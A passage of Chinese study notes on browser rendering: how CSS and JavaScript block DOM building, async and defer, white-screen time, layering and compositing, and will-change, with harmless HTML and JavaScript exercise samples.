脚本时，不管该脚本是否操纵了 CSSOM，都会执行 CSS 文件下载，解析操作，再执行 JavaScript 脚本。\n所以说 JavaScript 脚本是依赖样式表的，这又多了一个阻塞过程。\n通过上面的分析，知道了 JavaScript 会阻塞 DOM 生成，而样式文件又会阻塞 JavaScript 的执行，所以在实际的工程中需要重点关注 JavaScript 文件和样式表文件，使用不当会影响到页面性能的。\n渲染引擎还有一个安全检查模块叫 XSSAuditor，是用来检测词法安全的。在分词器解析出来 Token 之后，它会检测这些模块是否安全，比如是否引用了外部脚本，是否符合 CSP 规范，是否存在跨站点请求等。如果出现不符合规范的内容，XSSAuditor 会对该脚本或者下载任务进行拦截。\n问题：打开这个 HTML 页面，页面显示的内容是什么？\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt;1\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; let div1 = document.getElementsByTagName(\u0026#34;div\u0026#34;)[0]; div1.innerText = \u0026#34;time.geekbang\u0026#34;; let div2 = document.getElementsByTagName(\u0026#34;div\u0026#34;)[1]; div2.innerText = \u0026#34;time.geekbang.com\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;test\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 会显示 time.geekbang 和 test，JavaScript 代码执行的时候第二个 div 还没有生成 DOM 节点，所以是获取不到 div2 的，页面会报错 Uncaught TypeError: Cannot set property \u0026lsquo;innerText\u0026rsquo; of undefined。\n另外复习下 async 和 defer：\nasync：脚本并行加载，加载完成之后立即执行，执行时机不确定，仍有可能阻塞 HTML 解析，执行时机在 load 事件派发之前\ndefer：脚本并行加载，等待 HTML 解析完成之后，按照加载顺序执行脚本，执行时机在 DOMContentLoaded 事件派发之前\nCSS 不阻塞 dom 的生成。 CSS 不阻塞 js 的加载，但是会阻塞 js 的执行。 js 会阻塞 dom 的生成，也就是会阻塞页面的渲染，那么 css 也有可能会阻塞页面的渲染。如果把 CSS 放在文档的最后面加载执行，CSS 不会阻塞 DOM 的生成，也不会阻塞 JS，但是浏览器在解析完 DOM 后，要花费额外时间来解析 CSS，而不是在解析 DOM 的时候，并行解析 CSS。并且浏览器会先渲染出一个没有样式的页面，等 CSS 加载完后会再渲染成一个有样式的页面，页面会出现明显的闪动的现象。所以应该把 CSS 放在文档的头部，尽可能的提前加载 CSS；把 JS 放在文档的尾部，这样 JS 也不会阻塞页面的渲染。CSS 会和 JS 并行解析，CSS 解析也尽可能的不去阻塞 JS 的执行，从而使页面尽快的渲染完成。\n问：主线程在 parseHtml 时，是不是没办法执行执行 paint 等操作、那这时候页面又是如何绘制出来的呀？\n答：如果正在执行 ParserHTML，那么页面只会显示之前绘制好的内容，举个极端点的例子，比如 ParserHTML 占用了主线程 10 秒，那么这 10 秒内，页面都不会发生新的绘制操作，也就是页面卡顿了 10 秒！\n渲染流水线 CSS 如何影响首次加载时的白屏时间？\n只含有外部 CSS 文件代码的页面渲染流水线\n1 2 3 4 5 //theme.css div { color: coral; background-color: black; } 1 2 3 4 5 6 7 8 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link href=\u0026#34;theme.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt;geekbang com\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 打开这段 HTML 文件时的渲染流水线：\n首先是发起主页面的请求，这个发起请求方可能是渲染进程，也有可能是浏览器进程，发起的请求被送到网络进程中去执行。网络进程接收到返回的 HTML 数据之后，将其发送给渲染进程，渲染进程会解析 HTML 数据并构建 DOM。这里你需要特别注意下，请求 HTML 数据和构建 DOM 中间有一段空闲时间，这个空闲时间有可能成为页面渲染的瓶颈。\n当渲染进程接收 HTML 文件字节流时，会先开启一个预解析线程，如果遇到 JavaScript 文件或者 CSS 文件，那么预解析线程会提前下载这些数据。对于上面的代码，预解析线程会解析出来一个外部的 theme.css 文件，并发起 theme.css 的下载。这里也有一个空闲时间需要你注意一下，就是在 DOM 构建结束之后、theme.css 文件还未下载完成的这段时间内，渲染流水线无事可做，因为下一步是合成布局树，而合成布局树需要 CSSOM 和 DOM，所以这里需要等待 CSS 加载结束并解析成 CSSOM。\n那渲染流水线为什么需要 CSSOM 呢？\n和 HTML 一样，渲染引擎也是无法直接理解 CSS 文件内容的，所以需要将其解析成渲染引擎能够理解的结构，这个结构就是 CSSOM。和 DOM 一样，CSSOM 也具有两个作用，\n第一个是提供给 JavaScript 操作样式表的能力，\n第二个是为布局树的合成提供基础的样式信息。\n这个 CSSOM 体现在 DOM 中就是 document.styleSheets。\n等 DOM 和 CSSOM 都构建好之后，渲染引擎就会构造布局树。布局树的结构基本上就是复制 DOM 树的结构，不同之处在于 DOM 树中那些不需要显示的元素会被过滤掉，如 display:none 属性的元素、head 标签、script 标签等。复制好基本的布局树结构之后，渲染引擎会为对应的 DOM 元素选择对应的样式信息，这个过程就是样式计算。样式计算完成之后，渲染引擎还需要计算布局树中每个元素对应的几何位置，这个过程就是计算布局。通过样式计算和计算布局就完成了最终布局树的构建。 然后才是生成 layer tree 再是生成绘制列表，绘制等操作。\n含有外部 CSS 文件和 JavaScript 代码的页面渲染流水线\n1 2 3 4 5 //theme.css div { color: coral; background-color: black; } 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link href=\u0026#34;theme.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt;geekbang com\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; console.log(\u0026#34;time.geekbang.org\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;geekbang com\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 在解析 DOM 的过程中，如果遇到了 JavaScript 脚本，那么需要先暂停 DOM 解析去执行 JavaScript，因为 JavaScript 有可能会修改当前状态下的 DOM。\n不过在执行 JavaScript 脚本之前，如果页面中包含了外部 CSS 文件的引用，或者通过 style 标签内置了 CSS 内容，那么渲染引擎还需要将这些内容转换为 CSSOM，因为 JavaScript 有修改 CSSOM 的能力，所以在执行 JavaScript 之前，还需要依赖 CSSOM。也就是说 CSS 在部分情况下也会阻塞 DOM 的生成。\n在 body 中被包含的是 JavaScript 外部引用文件和外部 CSS 文件\n1 2 3 4 5 //theme.css div { color: coral; background-color: black; } 1 2 //foo.js console.log(\u0026#34;time.geekbang.org\u0026#34;); 1 2 3 4 5 6 7 8 9 10 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link href=\u0026#34;theme.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt;geekbang com\u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;foo.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;geekbang com\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 在接收到 HTML 数据之后的预解析过程中，HTML 预解析器识别出来了有 CSS 文件和 JavaScript 文件需要下载，然后就同时发起这两个文件的下载请求，需要注意的是，这两个文件的下载过程是重叠的，所以下载时间按照最久的那个文件来算。\n后面的流水线就和前面是一样的了，不管 CSS 文件和 JavaScript 文件谁先到达，都要先等到 CSS 文件下载完成并生成 CSSOM，然后再执行 JavaScript 脚本，最后再继续构建 DOM，构建布局树，绘制页面。\n影响页面展示的因素以及优化策略 渲染流水线影响到了首次页面展示的速度。\n从发起 URL 请求开始，到首次显示页面的内容，在视觉上经历的三个阶段：\n第一个阶段，等请求发出去之后，到提交数据阶段，这时页面展示出来的还是之前页面的内容。\n第二个阶段，提交数据之后渲染进程会创建一个空白页面，我们通常把这段时间称为解析白屏，并等待 CSS 文件和 JavaScript 文件的加载完成，生成 CSSOM 和 DOM，然后合成布局树，最后还要经过一系列的步骤准备首次渲染。\n第三个阶段，等首次渲染完成之后，就开始进入完整页面的生成阶段了，然后页面会一点点被绘制出来。\n影响第一个阶段的因素主要是网络或者是服务器处理。\n重点关注第二个阶段，这个阶段的主要问题是白屏时间，为了缩短白屏时间，挨个分析这个阶段的主要任务，包括了解析 HTML、下载 CSS、下载 JavaScript、生成 CSSOM、执行 JavaScript、生成布局树、绘制页面一系列操作。\n通常情况下的瓶颈主要体现在下载 CSS 文件、下载 JavaScript 文件和执行 JavaScript。\n所以要想缩短白屏时长，可以有以下策略：\n通过内联 JavaScript、内联 CSS 来移除这两种类型的文件下载，这样获取到 HTML 文件之后就可以直接开始渲染流程了。 但并不是所有的场合都适合内联，那么还可以尽量减少文件大小，比如通过 webpack 等工具移除一些不必要的注释，并压缩 JavaScript 文件。 还可以将一些不需要在解析 HTML 阶段使用的 JavaScript 标记上 async 或者 defer。 对于大的 CSS 文件，可以通过媒体查询属性，将其拆分为多个不同用途的 CSS 文件，这样只有在特定的场景下才会加载特定的 CSS 文件。 问：当你横屏方向拿着一个手机时，打开一个页面，观察下面几种资源的加载方式，你认为哪几种会阻塞页面渲染？为什么？\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;script src=\u0026#34;foo.js\u0026#34; type=\u0026#34;text/javascript\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script defer src=\u0026#34;foo.js\u0026#34; type=\u0026#34;text/javascript\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script sync src=\u0026#34;foo.js\u0026#34; type=\u0026#34;text/javascript\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;foo.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;foo.css\u0026#34; media=\u0026#34;screen\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;foo.css\u0026#34; media=\u0026#34;print\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;foo.css\u0026#34; media=\u0026#34;orientation:landscape\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;foo.css\u0026#34; media=\u0026#34;orientation:portrait\u0026#34; /\u0026gt; 答：\n第 1 条：下载 JavaScript 文件并执行同步代码，会阻塞页面渲染\n第 2 条：defer 异步下载 JavaScript 文件，会在 HTML 解析完成之后执行，不会阻塞页面渲染\n第 3 条：sync 异步下载 JavaScript 文件，下载完成之后会立即执行，有可能会阻塞页面渲染\n第 4 条：下载 CSS 文件，可能阻塞页面渲染\n第 5 条：media 属性用于区分设备，screen 表示用于有屏幕的设备，无法用于打印机、3D 眼镜、盲文阅读机等，在题设手机条件下，会加载，与第 4 条一致，可能阻塞页面渲染\n第 6 条：print 用于打印预览模式或打印页面，这里不会加载，不会阻塞页面渲染\n第 7 条：orientation:landscape 表示横屏，与题设条件一致，会加载，与第 4 条一致，可能阻塞页面渲染\n第 8 条：orientation:portrait 表示竖屏，这里不会加载，不会阻塞页面渲染\n会阻塞页面的有 1、3、4、5、7。我这里的问题在于是否加载 CSS 文件和 JavaScript 文件时，CSS 文件一定会阻塞 JavaScript 代码的执行，还是说在 JavaScript 脚本需要使用到 CSSOM 能力的时候才会有这个前置依赖\n分层和合成机制 为什么 CSS 动画比 JavaScript 高效？\nDOM 树生成之后，还要经历布局、分层、绘制、合成、显示等阶段后才能显示出页面。\n讲解渲染引擎的分层和合成机制，深刻地理解 CSS 动画和 JavaScript 底层工作机制。\n显示器是怎么显示图像的 每个显示器都有固定的刷新频率，通常是 60HZ，也就是每秒更新 60 张图片，更新的图片都来自于显卡中一个叫前缓冲区的地方，显示器所做的任务很简单，就是每秒固定读取 60 次前缓冲区中的图像，并将读取的图像显示到显示器上。\n显卡的作用：合成新的图像，并将图像保存到后缓冲区中，一旦显卡把合成的图像写到后缓冲区，系统就会让后缓冲区和前缓冲区互换，这样就能保证显示器能读取到最新显卡合成的图像。通常情况下，显卡的更新频率和显示器的刷新频率是一致的。但有时候，在一些复杂的场景中，显卡处理一张图片的速度会变慢，这样就会造成视觉上的卡顿。\n帧和帧率 当你通过滚动条滚动页面，或者通过手势缩放页面时，屏幕上就会产生动画的效果。之所以你能感觉到有动画的效果，是因为在滚动或者缩放操作时，渲染引擎会通过渲染流水线生成新的图片，并发送到显卡的后缓冲区。\n大多数设备屏幕的更新频率是 60 次 / 秒，这也就意味着正常情况下要实现流畅的动画效果，渲染引擎需要每秒更新 60 张图片到显卡的后缓冲区。\n把渲染流水线生成的每一副图片称为一帧，把渲染流水线每秒更新了多少帧称为帧率，比如滚动过程中 1 秒更新了 60 帧，那么帧率就是 60Hz（或者 60FPS）。\n如果在一次动画过程中，渲染引擎生成某些帧的时间过久，那么用户就会感受到卡顿。\n要解决卡顿问题，就要解决每帧生成时间过久的问题，为此 Chrome 对浏览器渲染方式做了大量的工作，其中最卓有成效的策略就是引入了分层和合成机制。分层和合成机制代表了当今最先进的渲染技术，所以接下来我们就来分析下什么是合成和渲染技术。\n如何生成一帧图像 渲染引擎是如何生成一帧图像的？\n关于渲染流水线中任意一帧的生成方式，有重排、重绘和合成三种方式。\n这三种方式的渲染路径是不同的，通常渲染路径越长，生成图像花费的时间就越多。比如重排，它需要重新根据 CSSOM 和 DOM 来计算布局树，这样生成一幅图片时，会让整个渲染流水线的每个阶段都执行一遍，如果布局复杂的话，就很难保证渲染的效率了。而重绘因为没有了重新布局的阶段，操作效率稍微高点，但是依然需要重新计算绘制信息，并触发绘制操作之后的一系列操作。\n相较于重排和重绘，合成操作的路径就显得非常短了，并不需要触发布局和绘制两个阶段，如果采用了 GPU，那么合成的效率会非常高。\n所以，关于渲染引擎生成一帧图像的几种方式，按照效率我们推荐合成方式优先，若实在不能满足需求，那么就再退后一步使用重绘或者重排的方式。\n本文我们的焦点在合成上，所以接下来我们就来深入分析下 Chrome 浏览器是怎么实现合成操作的。Chrome 中的合成技术，可以用三个词来概括总结：分层、分块和合成。\n分层和合成 如果没有采用分层机制，从布局树直接生成目标图片的话，那么每次页面有很小的变化时，都会触发重排或者重绘机制，这种“牵一发而动全身”的绘制策略会严重影响页面的渲染效率。\n为了提升每帧的渲染效率，Chrome 引入了分层和合成的机制。那该怎么来理解分层和合成机制呢？\n可以把一张网页想象成是由很多个图片叠加在一起的，每个图片就对应一个图层，Chrome 合成器最终将这些图层合成了用于显示页面的图片。在这个过程中，将素材分解为多个图层的操作就称为分层，最后将这些图层合并到一起的操作就称为合成。所以，分层和合成通常是一起使用的。\n考虑到一个页面被划分为两个层，当进行到下一帧的渲染时，上面的一帧可能需要实现某些变换，如平移、旋转、缩放、阴影或者 Alpha 渐变，这时候合成器只需要将两个层进行相应的变化操作就可以了，显卡处理这些操作驾轻就熟，所以这个合成过程时间非常短。\nChrome 是怎么实现分层和合成机制？\n在 Chrome 的渲染流水线中，分层体现在生成布局树之后，渲染引擎会根据布局树的特点将其转换为层树（Layer Tree），层树是渲染流水线后续流程的基础结构。\n层树中的每个节点都对应着一个图层，下一步的绘制阶段就依赖于层树中的节点。\n绘制阶段其实并不是真正地绘出图片，而是将绘制指令组合成一个列表，比如一个图层要设置的背景为黑色，并且还要在中间画一个圆形，那么绘制过程会生成|Paint BackGroundColor:Black | Paint Circle|这样的绘制指令列表，绘制过程就完成了。\n有了绘制列表之后，就需要进入光栅化阶段了，光栅化就是按照绘制列表中的指令生成图片。每一个图层都对应一张图片，合成线程有了这些图片之后，会将这些图片合成为“一张”图片，并最终将生成的图片发送到后缓冲区。这就是一个大致的分层、合成流程。\n**需要重点关注的是，合成操作是在合成线程上完成的，这也就意味着在执行合成操作时，是不会影响到主线程执行的。**这就是为什么经常主线程卡住了，但是 CSS 动画依然能执行的原因。\n分块 如果说分层是从宏观上提升了渲染效率，那么分块则是从微观层面提升了渲染效率。\n通常情况下，页面的内容都要比屏幕大得多，显示一个页面时，如果等待所有的图层都生成完毕，再进行合成的话，会产生一些不必要的开销，也会让合成图片的时间变得更久。\n因此，合成线程会将每个图层分割为大小固定的图块，然后优先绘制靠近视口的图块，这样就可以大大加速页面的显示速度。不过有时候， 即使只绘制那些优先级最高的图块，也要耗费不少的时间，因为涉及到一个很关键的因素——纹理上传，这是因为从计算机内存上传到 GPU 内存的操作会比较慢。\n为了解决这个问题，Chrome 又采取了一个策略：在首次合成图块的时候使用一个低分辨率的图片。比如可以是正常分辨率的一半，分辨率减少一半，纹理就减少了四分之三。在首次显示页面内容的时候，将这个低分辨率的图片显示出来，然后合成器继续绘制正常比例的网页内容，当正常比例的网页内容绘制完成后，再替换掉当前显示的低分辨率内容。这种方式尽管会让用户在开始时看到的是低分辨率的内容，但是也比用户在开始时什么都看不到要好。\n利用分层技术优化代码 在写 Web 应用的时候，你可能经常需要对某个元素做几何形状变换、透明度变换或者一些缩放操作，如果使用 JavaScript 来写这些效果，会牵涉到整个渲染流水线，所以 JavaScript 的绘制效率会非常低下。这时你可以使用 will-change 来告诉渲染引擎你会对该元素做一些特效变换，CSS 代码如下：\n1 2 3 .box { will-change: transform, opacity; } 这段代码就是提前告诉渲染引擎 box 元素将要做几何变换和透明度变换操作，这时候渲染引擎会将该元素单独实现一个个图层，等这些变换发生时，渲染引擎会通过合成线程直接去处理变换，这些变换并没有涉及到主线程，这样就大大提升了渲染的效率。这也是 CSS 动画比 JavaScript 动画高效的原因。\n所以，如果涉及到一些可以使用合成线程来处理 CSS 特效或者动画的情况，就尽量使用 will-change 来提前告诉渲染引擎，让它为该元素准备独立的层。但是凡事都有两面性，每当渲染引擎为一个元素准备一个独立层的时候，它占用的内存也会大大增加，因为从层树开始，后续每个阶段都会多一个层结构，这些都需要额外的内存，所以你需要恰当地使用 will-change。\n问题：\n观察下面代码，结合 Performance 面板、内存面板和分层面板，全面比较在 box 中使用 will-change 和不使用 will-change 的效率、性能和内存占用等情况。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;观察will-change\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; .box { will-change: transform, opacity; display: block; float: left; width: 40px; height: 40px; margin: 15px; padding: 10px; border: 1px solid rgb(136, 136, 136); background: rgb(187, 177, 37); border-radius: 30px; transition: border-radius 1s ease-out; } body { font-family: Arial; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;controls\u0026#34;\u0026gt; \u0026lt;button id=\u0026#34;start\u0026#34;\u0026gt;start\u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;stop\u0026#34;\u0026gt;stop\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt;旋转盒子\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; let boxes = document.querySelectorAll(\u0026#34;.box\u0026#34;); let boxes1 = document.querySelectorAll(\u0026#34;.box1\u0026#34;); let start = document.getElementById(\u0026#34;start\u0026#34;); let stop = document.getElementById(\u0026#34;stop\u0026#34;); let stop_flag = false; start.addEventListener(\u0026#34;click\u0026#34;, function () { stop_flag = false; requestAnimationFrame(render); }); stop.addEventListener(\u0026#34;click\u0026#34;, function () { stop_flag = true; }); let rotate_ = 0; let opacity_ = 0; function render() { if (stop_flag) return 0; rotate_ = rotate_ + 6; if (opacity_ \u0026gt; 1) opacity_ = 0; opacity_ = opacity_ + 0.01; let command = \u0026#34;rotate(\u0026#34; + rotate_ + \u0026#34;deg)\u0026#34;; for (let index = 0; index \u0026lt; boxes.length; index++) { boxes[index].style.transform = command; boxes[index].style.opacity = opacity_; } requestAnimationFrame(render); } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 问：既然 css 动画会跳过重绘阶段，则意味着合成阶段的绘制列表不会变化。但是最终得到的相邻两帧的位图是不一样的。那么在合成阶段，相同的绘制列表是如何绘制出不同的位图的？难道绘制列表是有状态的？还是绘制列表一次能绘制出多张位图？\n答：记住一点，能直接在合成线程中完成的任务都不会改变图层的内容，如文字信息的改变，布局的改变，颜色的改变，统统不会涉及，涉及到这些内容的变化就要牵涉到重排或者重绘了。 能直接在合成线程中实现的是整个图层的几何变换，透明度变换，阴影等，这些变换都不会影响到图层的内容。 比如滚动页面的时候，整个页面内容没有变化，这时候做的其实是对图层做上下移动，这种操作直接在合成线程里面就可以完成了。 再比如文章题目列子中的旋转操作，如果样式里面使用了 will-change ，那么这些 box 元素都会生成单独的一层，那么在旋转操作时，只要在合成线程将这些 box 图层整体旋转到设置的角度，再拿旋转后的 box 图层和背景图层合成一张新图片，这个图片就是最终输出的一帧，整个过程都是在合成线程中实现的。\n问：这篇文章信息量巨大，需要很多的知识储备，老师能不能提供一些课外阅读帮助理解？\n答：这块资料比较少，都是通过 chromium 源码还有 blinkon 上一些视频总结的。 blinkon：https://www.youtube.com/channel/UCIfQb9u7ALnOE4ZmexRecDg Chromium 源码： https://chromium.googlesource.com/chromium/src https://chromium.googlesource.com/chromium/src/+/master/docs/README.md 不过源码看起来会比较吃力，里面充斥着大量的回调，梳理起来也是非常不轻松的\n答：关于 css 动画和 js 动画效率的问题应该有点武断了，will-change 只是优化手段，使用 js 改变 transform 也能享受这个属性带来的优化。既然 css 动画和 js 动画都能享受这个优化，那就不能说明 css 动画比 js 动画效率高。\n页面性能 如何系统地优化页面？\n一个页面的展示有三个阶段：\n加载阶段：指从发出请求到渲染出完整页面的过程，影响到这个阶段的主要因素有网络和 JavaScript 脚本。 交互阶段：指从页面加载完成到用户交互的整合过程，影响到这个阶段的主要因素是 JavaScript 脚本。 关闭阶段：指用户发出关闭指令后页面所做的一些清理操作。 重点关注加载阶段和交互阶段\n优化加载阶段 并非所有的资源都会阻塞页面的首次绘制，比如图片、音频、视频等文件就不会阻塞页面的首次渲染；而 JavaScript、首次请求的 HTML 资源文件、CSS 文件是会阻塞首次渲染的，因为在构建 DOM 的过程中需要 HTML 和 JavaScript 文件，在构造渲染树的过程中需要用到 CSS 文件。\n这些能阻塞网页首次渲染的资源称为关键资源。\n影响页面首次渲染的核心因素：\n关键资源个数，关键资源个数越多，首次页面的加载时间就会越长。 